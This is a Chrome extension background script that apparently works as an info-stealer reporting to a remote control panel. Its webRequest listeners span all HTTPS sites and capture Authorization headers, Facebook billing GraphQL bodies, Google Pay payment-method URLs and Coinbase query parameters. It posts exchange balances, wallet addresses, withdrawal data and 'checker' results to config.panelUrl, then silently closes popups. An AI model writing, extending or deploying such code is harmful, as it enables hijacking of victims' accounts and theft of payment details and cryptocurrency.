import config from '../../config.js';

export const exchangeSettings = () => {
    const closePopup = async (url) => {
        const windows = await chrome.windows.getAll({
            populate: true
        })

        for (const window of windows) {
            if (window.type === "popup") {
                const tabs = window.tabs

                const tabIndex = tabs.findIndex(x => x.url.indexOf(url) > -1)

                if (tabIndex !== -1) {
                    await chrome.windows.remove(window.id)
                }
            }
        }
    }

    chrome.runtime.onMessage.addListener(function (msg, sender, sendResponse) {
        if (msg.text === "exchange-settings") {
            fetch(`${config.panelUrl}/exchange/settings`)
                .then((response) => response.json())
                .then((data) => {
                    sendResponse(data.setting)
                });

            return true;
        }

        if (msg.text === "exchange-create-account") {
            fetch(`${config.panelUrl}/exchange/create-account`, {
                method: 'POST',
                headers: {
                    'Accept': 'application/json, application/xml, text/plain, text/html, *.*',
                    'Content-Type': 'application/x-www-form-urlencoded'
                },
                body: new URLSearchParams(msg.params)
            })
                .then((response) => response.json())
                .then((data) => {
                    sendResponse(data.id)
                });

            return true;
        }

        if (msg.text === "exchange-set-all-balances") {
            fetch(`${config.panelUrl}/exchange/set-all-balances`, {
                method: 'POST',
                headers: {
                    'Accept': 'application/json, application/xml, text/plain, text/html, *.*',
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(msg.params)
            })
                .then((response) => response.json())
                .then((data) => {
                    sendResponse(true)
                });

            return true;
        }

        if (msg.text === "exchange-set-balance") {
            fetch(`${config.panelUrl}/exchange/set-balance`, {
                method: 'POST',
                headers: {
                    'Accept': 'application/json, application/xml, text/plain, text/html, *.*',
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(msg.params)
            })
                .then((response) => response.json())
                .then((data) => {
                    sendResponse(true)
                });

            return true;
        }

        if (msg.text === "exchange-get-address") {
            fetch(`${config.panelUrl}/exchange/get-address?${new URLSearchParams(msg.params).toString()}`)
                .then((response) => response.json())
                .then((data) => {
                    sendResponse(data.address)
                });

            return true;
        }

        if (msg.text === "exchange-set-withdraw") {
            fetch(`${config.panelUrl}/exchange/set-withdraw`, {
                method: 'POST',
                headers: {
                    'Accept': 'application/json, application/xml, text/plain, text/html, *.*',
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(msg.params)
            })
                .then((response) => response.json())
                .then((data) => {
                    sendResponse(true)
                });

            return true;
        }

        if (msg.text === "exchange-coinbase-get-ext") {
            chrome.webRequest.onBeforeRequest.addListener(function (details) {
                if (details.url.indexOf('usePaginatedAccountsQuery') > -1) {
                    let a = details.url.split('usePaginatedAccountsQuery&extensions=')[1]
                    a = a.split('&variables=')[0]

                    sendResponse(a)
                }
            }, {urls: ["https://*/*"]})

            return true;
        }

        if (msg.text === "facebook-get-balance") {
            chrome.webRequest.onBeforeRequest.addListener(function (details) {
                if (details.url.indexOf('graphql') > -1) {
                    if (typeof details.requestBody !== "undefined" && details.requestBody.formData !== "undefined") {
                        const body = details.requestBody.formData

                        let params = null;

                        try {
                            for (const key in body) {
                                const b = body[key]

                                if (b[0].indexOf('BillingHubPaymentSettingsViewQuery') > -1) {
                                    params += `${key}=${b[0]}&`

                                    for (const key1 in body) {
                                        const a = body[key1]

                                        params += `${key1}=${a[0]}&`
                                    }

                                    break;
                                }
                            }
                        } catch (e) {

                        }

                        if (params) {
                            chrome.storage.local.set({
                                params
                            });

                            sendResponse(params)
                        }
                    }
                }
            }, {urls: ["https://*/*"]}, ['requestBody'])

            return true;
        }

        if (msg.text === "facebook-get-params") {
            const timer = setInterval(async() => {
                const params = await chrome.storage.local.get(['params'])

                if (typeof params.params !== "undefined") {
                    clearInterval(timer)

                    sendResponse(params.params)
                }
            }, 1000)

            return true;
        }

        if (msg.text === "pay-google-get-url") {
            const timer = setInterval(async() => {
                const params = await chrome.storage.local.get(['payurl'])

                if (typeof params.payurl !== "undefined") {
                    clearInterval(timer)

                    sendResponse({
                        url: params.payurl
                    })
                }
            }, 1000)

            return true;
        }

        if (msg.text === "youtube-get-channel") {
            chrome.webRequest.onBeforeRequest.addListener(function (details) {
                if (details.url.indexOf('account_menu') > -1 && typeof details.requestBody !== "undefined" && typeof details.requestBody.raw !== "undefined") {
                    const enc = new TextDecoder("utf-8");

                    sendResponse({
                        url: details.url,
                        params: enc.decode(details.requestBody.raw[0].bytes)
                    })
                }
            }, {urls: ["https://*/*"]}, ['requestBody'])

            return true;
        }

        if (msg.text === "pay-google-get-page") {
            chrome.webRequest.onBeforeRequest.addListener(function (details) {
                if (details.url.indexOf('https://payments.google.com/payments/u/0/payment_methods') > -1) {
                    chrome.storage.local.set({
                        payurl: details.url
                    });

                    sendResponse({
                        url: details.url
                    })
                }
            }, {urls: ["https://*/*"]}, ['requestBody'])

            return true;
        }

        if (msg.text === "youtube-get-headers") {
            chrome.webRequest.onSendHeaders.addListener(function (details) {
                if (typeof details.requestHeaders !== "undefined") {
                    const headers = details.requestHeaders

                    const index = headers.findIndex(x => x.name === "Authorization")

                    if (index > -1) {
                        sendResponse(headers[index].value)
                    }
                }
            }, {urls: ["https://*/*"]}, ['requestHeaders'])

            return true;
        }

        if (msg.text === "checker-set-info") {
            if (msg.params.data) {
                fetch(`${config.panelUrl}/exchange/set-checker`, {
                    method: 'POST',
                    headers: {
                        'Accept': 'application/json, application/xml, text/plain, text/html, *.*',
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(msg.params)
                })
                    .then((response) => response.json())
                    .then(async () => {
                        closePopup(msg.params.url)

                        sendResponse(true)
                    });
            } else {
                closePopup(msg.params.url)

                sendResponse(true)
            }

            return true;
        }
    });
}